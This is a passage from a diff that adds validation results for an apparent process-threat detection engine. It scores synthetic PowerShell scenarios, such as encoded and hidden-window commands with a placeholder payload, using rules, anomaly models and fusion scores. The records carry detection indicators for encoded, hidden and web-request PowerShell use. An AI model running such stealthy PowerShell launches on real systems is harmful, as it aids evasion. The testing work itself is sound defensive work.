+          "script_network_reference"
+        ],
+        "statistical_indicators": [],
+        "fusion_name": "process_threat_fusion_v3",
+        "fusion_version": "v3",
+        "primary_engine": "process_threat_fusion_v3",
+        "operating_mode": "PRODUCTION_PRIMARY",
+        "primary_decision": true,
+        "promoted_to_primary": true,
+        "temporal_ai_score": 0.0,
+        "active_categories": [],
+        "strong_categories": [],
+        "temporal_ai_available": false,
+        "ai_temporal_disagreement": false,
+        "ai_temporal_score_difference": null,
+        "fusion_v3": {
+          "fusion_name": "sentinelx_process_threat_fusion",
+          "fusion_version": "v3",
+          "fusion_score": 24.36,
+          "severity": "LOW",
+          "suspicious": false,
+          "should_alert": false,
+          "critical_allowed": false,
+          "critical_evidence_gate": false,
+          "evidence_confidence": "LOW",
+          "available_category_count": 3,
+          "active_signal_count": 0,
+          "strong_signal_count": 0,
+          "available_categories": [
+            "rules",
+            "statistical",
+            "behavioral_ai"
+          ],
+          "active_categories": [],
+          "strong_categories": [],
+          "scores": {
+            "rules": 30.0,
+            "statistical": 0.0,
+            "behavioral_ai_consensus": 31.08,
+            "temporal_ai": 0.0
+          },
+          "categories": {
+            "rules": {
+              "available": true,
+              "score": 30.0,
+              "active": false,
+              "strong": false
+            },
+            "statistical": {
+              "available": true,
+              "score": 0.0,
+              "active": false,
+              "strong": false
+            },
+            "behavioral_ai": {
+              "available": true,
+              "score": 31.08,
+              "active": false,
+              "strong": false
+            },
+            "temporal_ai": {
+              "available": false,
+              "score": 0.0,
+              "active": false,
+              "strong": false
+            }
+          },
+          "behavioral_ai_consensus": {
+            "available": true,
+            "model_count": 2,
+            "isolation_forest_available": true,
+            "autoencoder_available": true,
+            "isolation_forest_score": 27.73,
+            "autoencoder_score": 34.43,
+            "average_score": 31.08,
+            "consensus_score": 31.08,
+            "consensus_label": "NORMAL",
+            "agreement": "VERY_HIGH",
+            "agreement_difference": 6.7,
+            "isolation_forest_active": false,
+            "autoencoder_active": false,
+            "isolation_forest_strong": false,
+            "autoencoder_strong": false,
+            "both_active": false,
+            "both_strong": false,
+            "disagreement": false,
+            "confidence": "MODERATE",
+            "reason": "Behavioral AI models do not jointly report a strong anomaly."
+          },
+          "temporal_ai_available": false,
+          "ai_temporal_score_difference": null,
+          "ai_temporal_disagreement": false,
+          "modifiers": {
+            "active_bonus": 0.0,
+            "strong_bonus": 0.0,
+            "rule_behavior_bonus": 0.0,
+            "rule_temporal_bonus": 0.0,
+            "behavioral_temporal_agreement_bonus": 0.0,
+            "disagreement_penalty": 0.0,
+            "single_source_cap": null,
+            "ai_only_evidence_cap_applied": false
+          },
+          "overall_weighted_score": 24.36,
+          "active_weighted_score": 0.0,
+          "reasons": [],
+          "interpretation": "Fusion score combines rules, statistical behavior, dual behavioral AI consensus and temporal AI. It is a defensive risk score, not a probability of compromise.",
+          "result_id": 37,
+          "operating_mode": "PRODUCTION_PRIMARY",
+          "bridge_name": "sentinelx_fusion_v3_evidence_bridge",
+          "bridge_version": "v1",
+          "evidence_bridge_complete": true,
+          "fusion_v2_comparison": {
+            "available": true,
+            "fusion_v2_score": 24.38,
+            "fusion_v2_severity": "LOW",
+            "fusion_v2_rule_score": 30.0,
+            "fusion_v2_statistical_score": 0.0,
+            "fusion_v2_ai_consensus_score": 31.08,
+            "score_delta_v3_minus_v2": -0.019999999999999574
+          }
+        },
+        "fusion_v2_reference": {
+          "rule_score": 30.0,
+          "statistical_score": 0.0,
+          "ai_consensus_score": 31.08,
+          "ai_consensus": {
+            "available": true,
+            "model_count": 2,
+            "isolation_forest_available": true,
+            "autoencoder_available": true,
+            "isolation_forest_score": 27.73,
+            "autoencoder_score": 34.43,
+            "average_score": 31.08,
+            "consensus_score": 31.08,
+            "consensus_label": "NORMAL",
+            "agreement": "VERY_HIGH",
+            "agreement_difference": 6.7,
+            "isolation_forest_active": false,
+            "autoencoder_active": false,
+            "isolation_forest_strong": false,
+            "autoencoder_strong": false,
+            "both_active": false,
+            "both_strong": false,
+            "disagreement": false,
+            "confidence": "MODERATE",
+            "reason": "Behavioral AI models do not jointly report a strong anomaly.",
+            "fusion_v3_category_score": 31.08
+          },
+          "active_signals": {
+            "rules": false,
+            "statistical": false,
+            "behavioral_ai_consensus": false
+          },
+          "strong_signals": {
+            "rules": false,
+            "statistical": false,
+            "behavioral_ai_consensus": false
+          },
+          "active_signal_count": 0,
+          "strong_signal_count": 0,
+          "weighted_score": 24.38,
+          "agreement_bonus": 0.0,
+          "strong_bonus": 0.0,
+          "ai_internal_bonus": 0.0,
+          "ai_disagreement_penalty": 0.0,
+          "fusion_score": 24.38,
+          "severity": "LOW",
+          "suspicious": false,
+          "should_alert": false,
+          "critical_allowed": false,
+          "evidence_confidence": "NONE",
+          "reasons": [
+            "No detection category crossed its suspicious threshold."
+          ],
+          "behavior_indicators": [
+            "monitored_binary",
+            "command:invoke-webrequest",
+            "script_network_reference"
+          ],
+          "statistical_indicators": []
+        },
+        "rollback_engine": "process_threat_fusion_v2",
+        "rollback_available": true,
+        "fusion_v2_comparison": {
+          "available": true,
+          "fusion_v2_score": 24.38,
+          "fusion_v2_severity": "LOW",
+          "fusion_v2_rule_score": 30.0,
+          "fusion_v2_statistical_score": 0.0,
+          "fusion_v2_ai_consensus_score": 31.08,
+          "score_delta_v3_minus_v2": -0.019999999999999574
+        }
+      },
+      "feature_record_id": 37,
+      "detections": [],
+      "stored_detection_count": 0,
+      "live_counter_before": 0,
+      "live_counter_after": 0,
+      "live_isolation_ok": true,
+      "failures": [],
+      "passed": true
+    },
+    {
+      "scenario_id": "P1-04",
+      "scenario_name": "Encoded PowerShell",
+      "event_id": "131dccea-952b-4709-b74b-d3295d144c04",
+      "process": {
+        "pid": 992104,
+        "ppid": 991000,
+        "name": "powershell.exe",
+        "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "cmdline": "powershell.exe -NoProfile -EncodedCommand SYNTHETIC_PAYLOAD",
+        "username": "sentinel-validation",
+        "create_time": 1791227445.3701909,
+        "parent_name": "explorer.exe",
+        "cpu_percent": 0.5,
+        "memory_percent": 0.2,
+        "rss_mb": 45.0,
+        "num_threads": 8,
+        "num_handles": 120
+      },
+      "rule": {
+        "behavior_score": 35,
+        "severity": "MEDIUM",
+        "suspicious": true,
+        "reasons": [
+          "Security-relevant Windows utility observed",
+          "Command-line indicator observed: -encodedcommand"
+        ],
+        "indicators": [
+          "monitored_binary",
+          "command:-encodedcommand"
+        ],
+        "process_name": "powershell.exe",
+        "parent_name": "explorer.exe"
+      },
+      "statistical": {
+        "process_name": "powershell.exe",
+        "anomaly_score": 0,
+        "severity": "INFO",
+        "anomalous": false,
+        "cpu_percent": 0.5,
+        "memory_percent": 0.2,
+        "num_threads": 8.0,
+        "cpu_z_score": 0.0,
+        "memory_z_score": 0.0,
+        "thread_z_score": 0.0,
+        "indicators": [],
+        "reasons": [],
+        "history_samples": 4,
+        "timestamp": 1791227451.1234372
+      },
+      "isolation_forest": {
+        "available": true,
+        "model_name": "sentinelx_process_isolation_forest",
+        "model_version": "v1",
+        "schema_version": "process_behavior_v1",
+        "feature_count": 19,
+        "decision_score": 0.05211757,
+        "raw_score": -0.44788243,
+        "model_prediction": 1,
+        "model_outlier": false,
+        "anomaly_confidence": 27.02,
+        "anomaly_label": "NORMAL",
+        "severity": "INFO",
+        "should_alert": false,
+        "feature_deviations": [
+          {
+            "feature": "is_script_interpreter",
+            "value": 1.0,
+            "baseline_mean": 0.0281,
+            "baseline_std": 0.1653,
+            "deviation_std": 5.8789
+          },
+          {
+            "feature": "recent_event_count",
+            "value": 1.0,
+            "baseline_mean": 7.0402,
+            "baseline_std": 9.8306,
+            "deviation_std": 0.6144
+          },
+          {
+            "feature": "num_handles",
+            "value": 120.0,
+            "baseline_mean": 464.0356,
+            "baseline_std": 579.8446,
+            "deviation_std": 0.5933
+          },
+          {
+            "feature": "is_system_path",
+            "value": 1.0,
+            "baseline_mean": 0.8592,
+            "baseline_std": 0.3478,
+            "deviation_std": 0.4049
+          },
+          {
+            "feature": "executable_path_depth",
+            "value": 6.0,
+            "baseline_mean": 5.2652,
+            "baseline_std": 2.0635,
+            "deviation_std": 0.3561
+          }
+        ],
+        "pid": 992104,
+        "process_name": "powershell.exe",
+        "parent_process_name": "explorer.exe",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "autoencoder": {
+        "available": true,
+        "model_name": "sentinelx_process_autoencoder",
+        "model_version": "v2",
+        "hidden_activation": "tanh",
+        "schema_version": "process_behavior_v1",
+        "feature_count": 19,
+        "reconstruction_error": 0.0948467802,
+        "reconstruction_region": "UPPER_5_PERCENT",
+        "anomaly_confidence": 44.96,
+        "anomaly_label": "UNUSUAL",
+        "severity": "LOW",
+        "candidate_alert": false,
+        "embedding_dimension": 4,
+        "behavior_embedding": [
+          0.96033756,
+          0.737924,
+          0.95569745,
+          0.41358599
+        ],
+        "feature_reconstruction_errors": [
+          {
+            "feature": "command_arg_count",
+            "actual_value": 4.0,
+            "reconstructed_value": 11.066068,
+            "scaled_squared_error": 0.69012153,
+            "absolute_original_difference": 7.066068
+          },
+          {
+            "feature": "num_handles",
+            "actual_value": 120.0,
+            "reconstructed_value": 600.925184,
+            "scaled_squared_error": 0.56549034,
+            "absolute_original_difference": 480.925184
+          },
+          {
+            "feature": "recent_event_count",
+            "actual_value": 1.0,
+            "reconstructed_value": 5.819172,
+            "scaled_squared_error": 0.20918099,
+            "absolute_original_difference": 4.819172
+          },
+          {
+            "feature": "command_line_length",
+            "actual_value": 59.0,
+            "reconstructed_value": 245.301784,
+            "scaled_squared_error": 0.19935915,
+            "absolute_original_difference": 186.301784
+          },
+          {
+            "feature": "num_threads",
+            "actual_value": 8.0,
+            "reconstructed_value": 13.739532,
+            "scaled_squared_error": 0.06031258,
+            "absolute_original_difference": 5.739532
+          }
+        ],
+        "calibration": {
+          "p50": 0.01421417566516108,
+          "p90": 0.08318183402218673,
+          "p95": 0.1278470974946212,
+          "p97": 0.16416013202775295,
+          "p99": 0.23687126271753484
+        },
+        "pid": 992104,
+        "process_name": "powershell.exe",
+        "parent_process_name": "explorer.exe",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "temporal": {
+        "state": "COLLECTING_HISTORY",
+        "available": true,
+        "depth": 1,
+        "score": null,
+        "severity": null,
+        "label": null,
+        "should_alert": null,
+        "result_id": null
+      },
+      "fusion": {
+        "rule_score": 35.0,
+        "statistical_score": 0.0,
+        "ai_consensus_score": 35.99,
+        "ai_consensus": {
+          "available": true,
+          "model_count": 2,
+          "isolation_forest_available": true,
+          "autoencoder_available": true,
+          "isolation_forest_score": 27.02,
+          "autoencoder_score": 44.96,
+          "average_score": 35.99,
+          "consensus_score": 35.99,
+          "consensus_label": "NORMAL",
+          "agreement": "HIGH",
+          "agreement_difference": 17.94,
+          "isolation_forest_active": false,
+          "autoencoder_active": false,
+          "isolation_forest_strong": false,
+          "autoencoder_strong": false,
+          "both_active": false,
+          "both_strong": false,
+          "disagreement": false,
+          "confidence": "MODERATE",
+          "reason": "Behavioral AI models do not jointly report a strong anomaly.",
+          "fusion_v3_category_score": 35.99
+        },
+        "active_signals": [
+          "rules"
+        ],
+        "strong_signals": [],
+        "active_signal_count": 1,
+        "strong_signal_count": 0,
+        "weighted_score": 28.35,
+        "agreement_bonus": 0.0,
+        "strong_bonus": 0.0,
+        "ai_internal_bonus": 0.0,
+        "ai_disagreement_penalty": 0.0,
+        "fusion_score": 32.6655,
+        "severity": "LOW",
+        "suspicious": false,
+        "should_alert": false,
+        "critical_allowed": false,
+        "evidence_confidence": "LIMITED",
+        "reasons": [
+          "RULE_EVIDENCE"
+        ],
+        "behavior_indicators": [
+          "monitored_binary",
+          "command:-encodedcommand"
+        ],
+        "statistical_indicators": [],
+        "fusion_name": "process_threat_fusion_v3",
+        "fusion_version": "v3",
+        "primary_engine": "process_threat_fusion_v3",
+        "operating_mode": "PRODUCTION_PRIMARY",
+        "primary_decision": true,
+        "promoted_to_primary": true,
+        "temporal_ai_score": 0.0,
+        "active_categories": [
+          "rules"
+        ],
+        "strong_categories": [],
+        "temporal_ai_available": false,
+        "ai_temporal_disagreement": false,
+        "ai_temporal_score_difference": null,
+        "fusion_v3": {
+          "fusion_name": "sentinelx_process_threat_fusion",
+          "fusion_version": "v3",
+          "fusion_score": 32.6655,
+          "severity": "LOW",
+          "suspicious": false,
+          "should_alert": false,
+          "critical_allowed": false,
+          "critical_evidence_gate": false,
+          "evidence_confidence": "LIMITED",
+          "available_category_count": 3,
+          "active_signal_count": 1,
+          "strong_signal_count": 0,
+          "available_categories": [
+            "rules",
+            "statistical",
+            "behavioral_ai"
+          ],
+          "active_categories": [
+            "rules"
+          ],
+          "strong_categories": [],
+          "scores": {
+            "rules": 35.0,
+            "statistical": 0.0,
+            "behavioral_ai_consensus": 35.99,
+            "temporal_ai": 0.0
+          },
+          "categories": {
+            "rules": {
+              "available": true,
+              "score": 35.0,
+              "active": true,
+              "strong": false
+            },
+            "statistical": {
+              "available": true,
+              "score": 0.0,
+              "active": false,
+              "strong": false
+            },
+            "behavioral_ai": {
+              "available": true,
+              "score": 35.99,
+              "active": false,
+              "strong": false
+            },
+            "temporal_ai": {
+              "available": false,
+              "score": 0.0,
+              "active": false,
+              "strong": false
+            }
+          },
+          "behavioral_ai_consensus": {
+            "available": true,
+            "model_count": 2,
+            "isolation_forest_available": true,
+            "autoencoder_available": true,
+            "isolation_forest_score": 27.02,
+            "autoencoder_score": 44.96,
+            "average_score": 35.99,
+            "consensus_score": 35.99,
+            "consensus_label": "NORMAL",
+            "agreement": "HIGH",
+            "agreement_difference": 17.94,
+            "isolation_forest_active": false,
+            "autoencoder_active": false,
+            "isolation_forest_strong": false,
+            "autoencoder_strong": false,
+            "both_active": false,
+            "both_strong": false,
+            "disagreement": false,
+            "confidence": "MODERATE",
+            "reason": "Behavioral AI models do not jointly report a strong anomaly."
+          },
+          "temporal_ai_available": false,
+          "ai_temporal_score_difference": null,
+          "ai_temporal_disagreement": false,
+          "modifiers": {
+            "active_bonus": 0.0,
+            "strong_bonus": 0.0,
+            "rule_behavior_bonus": 0.0,
+            "rule_temporal_bonus": 0.0,
+            "behavioral_temporal_agreement_bonus": 0.0,
+            "disagreement_penalty": 0.0,
+            "single_source_cap": 79.0,
+            "ai_only_evidence_cap_applied": false
+          },
+          "overall_weighted_score": 28.33,
+          "active_weighted_score": 35.0,
+          "reasons": [
+            "RULE_EVIDENCE"
+          ],
+          "interpretation": "Fusion score combines rules, statistical behavior, dual behavioral AI consensus and temporal AI. It is a defensive risk score, not a probability of compromise.",
+          "result_id": 38,
+          "operating_mode": "PRODUCTION_PRIMARY",
+          "bridge_name": "sentinelx_fusion_v3_evidence_bridge",
+          "bridge_version": "v1",
+          "evidence_bridge_complete": true,
+          "fusion_v2_comparison": {
+            "available": true,
+            "fusion_v2_score": 28.35,
+            "fusion_v2_severity": "LOW",
+            "fusion_v2_rule_score": 35.0,
+            "fusion_v2_statistical_score": 0.0,
+            "fusion_v2_ai_consensus_score": 35.99,
+            "score_delta_v3_minus_v2": 4.3155
+          }
+        },
+        "fusion_v2_reference": {
+          "rule_score": 35.0,
+          "statistical_score": 0.0,
+          "ai_consensus_score": 35.99,
+          "ai_consensus": {
+            "available": true,
+            "model_count": 2,
+            "isolation_forest_available": true,
+            "autoencoder_available": true,
+            "isolation_forest_score": 27.02,
+            "autoencoder_score": 44.96,
+            "average_score": 35.99,
+            "consensus_score": 35.99,
+            "consensus_label": "NORMAL",
+            "agreement": "HIGH",
+            "agreement_difference": 17.94,
+            "isolation_forest_active": false,
+            "autoencoder_active": false,
+            "isolation_forest_strong": false,
+            "autoencoder_strong": false,
+            "both_active": false,
+            "both_strong": false,
+            "disagreement": false,
+            "confidence": "MODERATE",
+            "reason": "Behavioral AI models do not jointly report a strong anomaly.",
+            "fusion_v3_category_score": 35.99
+          },
+          "active_signals": {
+            "rules": true,
+            "statistical": false,
+            "behavioral_ai_consensus": false
+          },
+          "strong_signals": {
+            "rules": false,
+            "statistical": false,
+            "behavioral_ai_consensus": false
+          },
+          "active_signal_count": 1,
+          "strong_signal_count": 0,
+          "weighted_score": 28.35,
+          "agreement_bonus": 0.0,
+          "strong_bonus": 0.0,
+          "ai_internal_bonus": 0.0,
+          "ai_disagreement_penalty": 0.0,
+          "fusion_score": 28.35,
+          "severity": "LOW",
+          "suspicious": false,
+          "should_alert": false,
+          "critical_allowed": false,
+          "evidence_confidence": "LOW",
+          "reasons": [
+            "Rule evidence score=35.00"
+          ],
+          "behavior_indicators": [
+            "monitored_binary",
+            "command:-encodedcommand"
+          ],
+          "statistical_indicators": []
+        },
+        "rollback_engine": "process_threat_fusion_v2",
+        "rollback_available": true,
+        "fusion_v2_comparison": {
+          "available": true,
+          "fusion_v2_score": 28.35,
+          "fusion_v2_severity": "LOW",
+          "fusion_v2_rule_score": 35.0,
+          "fusion_v2_statistical_score": 0.0,
+          "fusion_v2_ai_consensus_score": 35.99,
+          "score_delta_v3_minus_v2": 4.3155
+        }
+      },
+      "feature_record_id": 38,
+      "detections": [],
+      "stored_detection_count": 0,
+      "live_counter_before": 0,
+      "live_counter_after": 0,
+      "live_isolation_ok": true,
+      "failures": [],
+      "passed": true
+    },
+    {
+      "scenario_id": "P1-05",
+      "scenario_name": "Hidden Encoded PowerShell",
+      "event_id": "6886c7ab-8781-424d-9982-8542dc1dbee4",
+      "process": {
+        "pid": 992105,
+        "ppid": 991000,
+        "name": "powershell.exe",
+        "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "cmdline": "powershell.exe -WindowStyle Hidden -EncodedCommand SYNTHETIC_PAYLOAD",
+        "username": "sentinel-validation",
+        "create_time": 1791227445.3701909,
+        "parent_name": "explorer.exe",
+        "cpu_percent": 0.5,
+        "memory_percent": 0.2,
+        "rss_mb": 45.0,
+        "num_threads": 8,
+        "num_handles": 120
+      },
+      "rule": {
+        "behavior_score": 50,
+        "severity": "MEDIUM",
+        "suspicious": true,
+        "reasons": [
+          "Security-relevant Windows utility observed",
+          "Command-line indicator observed: -encodedcommand",
+          "Command-line indicator observed: -windowstyle hidden"
+        ],
+        "indicators": [
+          "monitored_binary",
+          "command:-encodedcommand",
+          "command:-windowstyle hidden"
+        ],
+        "process_name": "powershell.exe",
+        "parent_name": "explorer.exe"
+      },
+      "statistical": {
+        "process_name": "powershell.exe",
+        "anomaly_score": 0,
+        "severity": "INFO",
+        "anomalous": false,
+        "cpu_percent": 0.5,
+        "memory_percent": 0.2,
+        "num_threads": 8.0,
+        "cpu_z_score": 0.0,
+        "memory_z_score": 0.0,
+        "thread_z_score": 0.0,
+        "indicators": [],
+        "reasons": [],
+        "history_samples": 5,
+        "timestamp": 1791227451.3043222
+      },
+      "isolation_forest": {
+        "available": true,
+        "model_name": "sentinelx_process_isolation_forest",
+        "model_version": "v1",
+        "schema_version": "process_behavior_v1",
+        "feature_count": 19,
+        "decision_score": 0.05160008,
+        "raw_score": -0.44839992,
+        "model_prediction": 1,
+        "model_outlier": false,
+        "anomaly_confidence": 27.15,
+        "anomaly_label": "NORMAL",
+        "severity": "INFO",
+        "should_alert": false,
+        "feature_deviations": [
+          {
+            "feature": "is_script_interpreter",
+            "value": 1.0,
+            "baseline_mean": 0.0281,
+            "baseline_std": 0.1653,
+            "deviation_std": 5.8789
+          },
+          {
+            "feature": "recent_event_count",
+            "value": 1.0,
+            "baseline_mean": 7.0402,
+            "baseline_std": 9.8306,
+            "deviation_std": 0.6144
+          },
+          {
+            "feature": "num_handles",
+            "value": 120.0,
+            "baseline_mean": 464.0356,
+            "baseline_std": 579.8446,
+            "deviation_std": 0.5933
+          },
+          {
+            "feature": "is_system_path",
+            "value": 1.0,
+            "baseline_mean": 0.8592,
+            "baseline_std": 0.3478,
+            "deviation_std": 0.4049
+          },
+          {
+            "feature": "executable_path_depth",
+            "value": 6.0,
+            "baseline_mean": 5.2652,
+            "baseline_std": 2.0635,
+            "deviation_std": 0.3561
+          }
+        ],
+        "pid": 992105,
+        "process_name": "powershell.exe",
+        "parent_process_name": "explorer.exe",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "autoencoder": {
+        "available": true,
+        "model_name": "sentinelx_process_autoencoder",
+        "model_version": "v2",
+        "hidden_activation": "tanh",
+        "schema_version": "process_behavior_v1",
+        "feature_count": 19,
+        "reconstruction_error": 0.0839033409,
+        "reconstruction_region": "UPPER_5_PERCENT",
+        "anomaly_confidence": 40.31,
+        "anomaly_label": "UNUSUAL",
+        "severity": "LOW",
+        "candidate_alert": false,
+        "embedding_dimension": 4,
+        "behavior_embedding": [
+          0.96064841,
+          0.73497883,
+          0.95658226,
+          0.41033154
+        ],
+        "feature_reconstruction_errors": [
+          {
+            "feature": "command_arg_count",
+            "actual_value": 5.0,
+            "reconstructed_value": 11.218604,
+            "scaled_squared_error": 0.53450989,
+            "absolute_original_difference": 6.218604
+          },
+          {
+            "feature": "num_handles",
+            "actual_value": 120.0,
+            "reconstructed_value": 583.541945,
+            "scaled_squared_error": 0.52534939,
+            "absolute_original_difference": 463.541945
+          },
+          {
+            "feature": "recent_event_count",
+            "actual_value": 1.0,
+            "reconstructed_value": 5.905838,
+            "scaled_squared_error": 0.21677231,
+            "absolute_original_difference": 4.905838
+          },
+          {
+            "feature": "command_line_length",
+            "actual_value": 68.0,
+            "reconstructed_value": 252.695412,
+            "scaled_squared_error": 0.19593605,
+            "absolute_original_difference": 184.695412
+          },
+          {
+            "feature": "num_threads",
+            "actual_value": 8.0,
+            "reconstructed_value": 13.187861,
+            "scaled_squared_error": 0.04927557,
+            "absolute_original_difference": 5.187861
+          }
+        ],
+        "calibration": {
+          "p50": 0.01421417566516108,
+          "p90": 0.08318183402218673,
+          "p95": 0.1278470974946212,
+          "p97": 0.16416013202775295,
+          "p99": 0.23687126271753484
+        },
+        "pid": 992105,
+        "process_name": "powershell.exe",
+        "parent_process_name": "explorer.exe",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "temporal": {
+        "state": "COLLECTING_HISTORY",
+        "available": true,
+        "depth": 1,
+        "score": null,
+        "severity": null,
+        "label": null,
+        "should_alert": null,
+        "result_id": null
+      },
+      "fusion": {
+        "rule_score": 50.0,
+        "statistical_score": 0.0,
+        "ai_consensus_score": 33.73,
+        "ai_consensus": {
+          "available": true,
+          "model_count": 2,
+          "isolation_forest_available": true,
+          "autoencoder_available": true,
+          "isolation_forest_score": 27.15,
+          "autoencoder_score": 40.31,
+          "average_score": 33.73,
+          "consensus_score": 33.73,
+          "consensus_label": "NORMAL",
+          "agreement": "HIGH",
+          "agreement_difference": 13.16,
+          "isolation_forest_active": false,
+          "autoencoder_active": false,
+          "isolation_forest_strong": false,
+          "autoencoder_strong": false,
+          "both_active": false,
+          "both_strong": false,
+          "disagreement": false,
+          "confidence": "MODERATE",
+          "reason": "Behavioral AI models do not jointly report a strong anomaly.",
+          "fusion_v3_category_score": 33.73
+        },
+        "active_signals": [
+          "rules"
+        ],
+        "strong_signals": [],
+        "active_signal_count": 1,
+        "strong_signal_count": 0,
+        "weighted_score": 34.31,
+        "agreement_bonus": 0.0,
+        "strong_bonus": 0.0,
+        "ai_internal_bonus": 0.0,
+        "ai_disagreement_penalty": 0.0,
+        "fusion_score": 44.6018,
+        "severity": "MEDIUM",
+        "suspicious": false,
+        "should_alert": false,
+        "critical_allowed": false,
+        "evidence_confidence": "LIMITED",
+        "reasons": [
+          "RULE_EVIDENCE"
+        ],
+        "behavior_indicators": [
+          "monitored_binary",
+          "command:-encodedcommand",
+          "command:-windowstyle hidden"
+        ],
+        "statistical_indicators": [],
+        "fusion_name": "process_threat_fusion_v3",
+        "fusion_version": "v3",
+        "primary_engine": "process_threat_fusion_v3",
+        "operating_mode": "PRODUCTION_PRIMARY",
+        "primary_decision": true,
+        "promoted_to_primary": true,
+        "temporal_ai_score": 0.0,
+        "active_categories": [
+          "rules"
+        ],
+        "strong_categories": [],
+        "temporal_ai_available": false,
+        "ai_temporal_disagreement": false,
+        "ai_temporal_score_difference": null,
+        "fusion_v3": {
+          "fusion_name": "sentinelx_process_threat_fusion",
+          "fusion_version": "v3",
+          "fusion_score": 44.6018,
+          "severity": "MEDIUM",
+          "suspicious": false,
+          "should_alert": false,
+          "critical_allowed": false,
+          "critical_evidence_gate": false,
+          "evidence_confidence": "LIMITED",
+          "available_category_count": 3,
+          "active_signal_count": 1,
+          "strong_signal_count": 0,
+          "available_categories": [
+            "rules",
+            "statistical",
+            "behavioral_ai"
+          ],
+          "active_categories": [
+            "rules"
+          ],
+          "strong_categories": [],
+          "scores": {
+            "rules": 50.0,
+            "statistical": 0.0,
+            "behavioral_ai_consensus": 33.73,
+            "temporal_ai": 0.0
+          },
+          "categories": {
+            "rules": {
+              "available": true,
+              "score": 50.0,
+              "active": true,
+              "strong": false
+            },
+            "statistical": {
+              "available": true,
+              "score": 0.0,
+              "active": false,
+              "strong": false
+            },
+            "behavioral_ai": {
+              "available": true,
+              "score": 33.73,
+              "active": false,
+              "strong": false
+            },
+            "temporal_ai": {
+              "available": false,
+              "score": 0.0,
+              "active": false,
+              "strong": false
+            }
+          },
+          "behavioral_ai_consensus": {
+            "available": true,
+            "model_count": 2,
+            "isolation_forest_available": true,
+            "autoencoder_available": true,
+            "isolation_forest_score": 27.15,
+            "autoencoder_score": 40.31,
+            "average_score": 33.73,
+            "consensus_score": 33.73,
+            "consensus_label": "NORMAL",
+            "agreement": "HIGH",
+            "agreement_difference": 13.16,
+            "isolation_forest_active": false,
+            "autoencoder_active": false,
+            "isolation_forest_strong": false,
+            "autoencoder_strong": false,
+            "both_active": false,
+            "both_strong": false,
+            "disagreement": false,
+            "confidence": "MODERATE",
+            "reason": "Behavioral AI models do not jointly report a strong anomaly."
+          },
+          "temporal_ai_available": false,
+          "ai_temporal_score_difference": null,
+          "ai_temporal_disagreement": false,
+          "modifiers": {
+            "active_bonus": 0.0,
+            "strong_bonus": 0.0,
+            "rule_behavior_bonus": 0.0,
+            "rule_temporal_bonus": 0.0,
+            "behavioral_temporal_agreement_bonus": 0.0,
+            "disagreement_penalty": 0.0,
+            "single_source_cap": 79.0,
+            "ai_only_evidence_cap_applied": false
+          },
+          "overall_weighted_score": 34.5767,
+          "active_weighted_score": 50.0,
+          "reasons": [
+            "RULE_EVIDENCE"
+          ],
+          "interpretation": "Fusion score combines rules, statistical behavior, dual behavioral AI consensus and temporal AI. It is a defensive risk score, not a probability of compromise.",
+          "result_id": 39,
+          "operating_mode": "PRODUCTION_PRIMARY",
+          "bridge_name": "sentinelx_fusion_v3_evidence_bridge",
+          "bridge_version": "v1",
+          "evidence_bridge_complete": true,
+          "fusion_v2_comparison": {
+            "available": true,
+            "fusion_v2_score": 37.5,
+            "fusion_v2_severity": "MEDIUM",
+            "fusion_v2_rule_score": 50.0,
+            "fusion_v2_statistical_score": 0.0,
+            "fusion_v2_ai_consensus_score": 33.73,
+            "score_delta_v3_minus_v2": 7.101799999999997
+          }
+        },
+        "fusion_v2_reference": {
+          "rule_score": 50.0,
+          "statistical_score": 0.0,
+          "ai_consensus_score": 33.73,
+          "ai_consensus": {
+            "available": true,
+            "model_count": 2,
+            "isolation_forest_available": true,
+            "autoencoder_available": true,
+            "isolation_forest_score": 27.15,
+            "autoencoder_score": 40.31,
+            "average_score": 33.73,
+            "consensus_score": 33.73,
+            "consensus_label": "NORMAL",
+            "agreement": "HIGH",
+            "agreement_difference": 13.16,
+            "isolation_forest_active": false,
+            "autoencoder_active": false,
+            "isolation_forest_strong": false,
+            "autoencoder_strong": false,
+            "both_active": false,
+            "both_strong": false,
+            "disagreement": false,
+            "confidence": "MODERATE",
+            "reason": "Behavioral AI models do not jointly report a strong anomaly.",
+            "fusion_v3_category_score": 33.73
+          },
+          "active_signals": {
+            "rules": true,
+            "statistical": false,
+            "behavioral_ai_consensus": false
+          },
+          "strong_signals": {
+            "rules": false,
+            "statistical": false,
+            "behavioral_ai_consensus": false
+          },
+          "active_signal_count": 1,
+          "strong_signal_count": 0,
+          "weighted_score": 34.31,
+          "agreement_bonus": 0.0,
+          "strong_bonus": 0.0,
+          "ai_internal_bonus": 0.0,
+          "ai_disagreement_penalty": 0.0,
+          "fusion_score": 37.5,
+          "severity": "MEDIUM",
+          "suspicious": true,
+          "should_alert": false,
+          "critical_allowed": false,
+          "evidence_confidence": "LOW",
+          "reasons": [
+            "Rule evidence score=50.00"
+          ],
+          "behavior_indicators": [
+            "monitored_binary",
+            "command:-encodedcommand",
+            "command:-windowstyle hidden"
+          ],
+          "statistical_indicators": []
+        },
+        "rollback_engine": "process_threat_fusion_v2",
+        "rollback_available": true,
+        "fusion_v2_comparison": {
+          "available": true,
+          "fusion_v2_score": 37.5,
+          "fusion_v2_severity": "MEDIUM",
+          "fusion_v2_rule_score": 50.0,
+          "fusion_v2_statistical_score": 0.0,
+          "fusion_v2_ai_consensus_score": 33.73,
+          "score_delta_v3_minus_v2": 7.101799999999997
+        }
+      },
+      "feature_record_id": 39,
+      "detections": [],
+      "stored_detection_count": 0,
+      "live_counter_before": 0,
+      "live_counter_after": 0,
+      "live_isolation_ok": true,
+      "failures": [],
+      "passed": true
+    },
+    {
+      "scenario_id": "P1-06",
+      "scenario_name": "Word spawning encoded PowerShell",
+      "event_id": "91e3809a-25dc-4a8e-a9e8-d9c6f2db00ad",
+      "process": {
+        "pid": 992106,
+        "ppid": 991000,
+        "name": "powershell.exe",
+        "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
